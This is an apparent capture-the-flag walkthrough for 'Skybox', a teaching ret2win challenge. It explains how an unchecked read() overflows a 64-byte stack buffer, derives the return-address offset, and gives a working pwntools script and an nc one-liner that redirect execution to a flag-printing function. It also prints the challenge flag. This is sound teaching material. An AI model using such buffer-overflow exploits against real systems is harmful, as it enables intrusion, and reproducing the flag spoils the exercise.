# Walkthrough: Skybox

The lesson is the classic **ret2win**: overflow a stack buffer far enough to
overwrite the saved return address, and redirect execution to a function you
were never meant to reach.

1. Look at the binary. `vuln()` reads 200 bytes into a 64-byte buffer with
   `read()`, so it overflows. `open_skybox()` opens `flag.txt` and prints it,
   but nothing ever calls it.

2. Find the address of `open_skybox`. The binary is not PIE, so it is fixed:

   ```
   nm skybox | grep open_skybox      # 000000000040127b T open_skybox
   # or: objdump -d skybox | grep open_skybox
   ```

3. Find the offset from the start of the input to the saved return address.
   The buffer is 64 bytes and there are 8 bytes of saved `rbp` above it, so the
   return address is at offset **72**. (Confirm with a cyclic pattern in gdb /
   pwntools if you like.)

4. Build the payload and send it:

   ```python
   from pwn import *
   e = ELF('./skybox')
   io = remote('EVENT_HOST', 8013)
   io.send(b'A'*72 + p64(e.symbols['open_skybox']))
   io.interactive()
   ```

   or without pwntools:

   ```sh
   python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*72 + struct.pack('<Q', 0x40127b))" | nc EVENT_HOST 8013
   ```

   The terminal prints:

   ```
   *** SKYBOX UNLOCKED ***
   BarSides{returned_to_the_skybox}
   ```

Notes:

- No stack canary (`-fno-stack-protector`) means the overflow reaches the
  return address unguarded. No PIE (`-no-pie`) means `open_skybox` has a fixed
  address, so no leak is needed.
- `open_skybox` is marked `force_align_arg_pointer` so it realigns the stack
  itself; a straight return into it works without hunting for a `ret` gadget.
  That keeps the focus on the one new idea (controlling the return address).
- This is the middle step of the Pwn series: Beginner overwrote an adjacent
  variable, this one overwrites the return address, and Advanced moves on to
  a format-string bug.
